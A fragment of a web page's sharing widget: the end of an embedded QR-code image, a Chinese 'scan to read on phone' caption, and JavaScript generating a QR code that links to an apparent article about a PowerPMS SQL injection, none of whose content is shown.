+8bpj2t9anJxpZuHPA/2uPJ0Xe6zIL3UIRyC6iuE+GDG7od1fjeQXnzxf3sCf2wg3rK+fcht6HrncOyD6PZ/hvbUI18hpHfPn9WbfxV7f+u6XvyPDaSaXfH7J/DHBwK5dd4CsW8V4oOgPgiHYNef9dGrRy6qnyHMz9ZvH0geguZFmPVep6/rwPX7kNuHfezeEKfWcbVvfTDfCgiHY7ROtL9cVBdh7qdeCOtc5e0pllYBqVMXYdYhvGoq9NW6AuY8hEOwPGexG8hZwZX/uyewDQQyRXiOX92Ot0i0HubnnOnmxd6v9COt9LM4q4PstfeBY91+Ha2H1EFQvXAbSJEr3n8C10DeP4NpB/8DAAD//wypoNgAAAAGSURBVAMA1XvRxYxhZxUAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-UploadFle-GetFilesData-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 